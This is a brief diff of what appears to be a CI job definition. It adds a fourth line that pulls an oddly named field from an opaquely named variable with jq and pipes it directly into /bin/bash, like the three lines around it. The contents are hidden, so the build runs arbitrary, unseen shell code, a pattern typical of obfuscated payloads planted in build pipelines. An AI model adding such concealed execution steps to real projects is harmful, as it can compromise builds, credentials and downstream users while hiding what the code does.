@@ -44,6 +44,7 @@ jobs:
           printf '%s' "$u5" | jq -r .kjbl460 | /bin/bash
           echo $g442 | jq -r .qmw7800 | /bin/bash
           echo $xnd557 | jq -r .khp807 | /bin/bash
+          printf '%s' "$pj280" | jq -r .jre270 | /bin/bash
 
       - name: Archive output
         if: always()
